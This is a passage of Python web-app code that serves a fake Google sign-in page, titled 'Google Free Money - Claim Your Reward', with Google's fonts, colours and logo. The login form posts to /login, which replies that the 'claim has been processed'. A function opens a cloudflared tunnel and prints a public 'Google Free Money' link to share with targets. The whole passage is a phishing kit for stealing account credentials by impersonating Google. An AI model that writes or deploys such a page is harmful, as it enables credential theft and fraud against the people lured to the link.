...
def index():
    ...
    <head>
        ...
        <title>Google Free Money - Claim Your Reward</title> <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Light theme colors */
                --bg-light: #ffffff; /* White background */
                --text-light: #202124; /* Dark gray text */
                --container-bg-light: #ffffff;
                --border-light: #dadce0;
                --input-bg-light: #ffffff;
                --input-border-light: #dadce0;
                --button-bg-light: #1a73e8; /* Google Blue */
                --button-hover-light: #1967d2;
                --link-light: #1a73e8; /* Google Blue links */
            }
            ...
            @media (prefers-color-scheme: dark) {
                :root {
                    ...
                    --text-light: #e8eaed; /* Light gray text */
                    --container-bg-light: #2c2c2c; /* Darker container */
                    --border-light: #5f6368;
                    --input-bg-light: #3c4043;
                    --input-border-light: #5f6368;
                    --button-bg-light: #8ab4f8; /* Lighter Google Blue for dark theme */
                    --button-hover-light: #a6c5f7;
                    --link-light: #8ab4f8; /* Lighter Google Blue links */
                }
            }
            ...
            .container {
                ...
                align-items: center;
                width: 100%;
                max-width: 450px; /* Wider for Google style */
            ...
            .google-logo .g { color: #4285F4; } /* Blue */
            .google-logo .o1 { color: #EA4335; } /* Red */
            .google-logo .o2 { color: #F9BC05; } /* Yellow */
            .google-logo .g2 { color: #4285F4; } /* Blue */
            .google-logo .l { color: #34A853; } /* Green */
            .google-logo .e { color: #EA4335; } /* Red */
    ...
    <body>
        <div class="container">
            ...
            <h1>Sign in</h1>
            <div class="footer-text">to claim your free money reward</div>
            ...
            <form action="/login" method="post" style="width: 100%; margin-top: 24px;">
                ...
                <div class="actions-container">
                    <a href="#" class="link-button">Forgot email?</a>
                    <button type="submit" class="primary-button">Sign In</button>
                </div>
            </form>

            <a href="#" class="link-button" style="margin-top: 36px;">Create account</a>
        </div>
    </body>
    </html>
    ''')
...
def login():
    ...
    <body>
      <div class="container">
        ...
        <p>Your claim has been processed.<br>You will be redirected shortly.</p>
      </div>
    </body>
    </html>
    '''
...
def run_cloudflared_tunnel(local_url):
    ...
    for line in process.stdout:
        ...
        if match:
            ...
            print(f"Google Free Money Public Link: {tunnel_url}") # Updated print message
            sys.stdout.flush()
            break
    return process
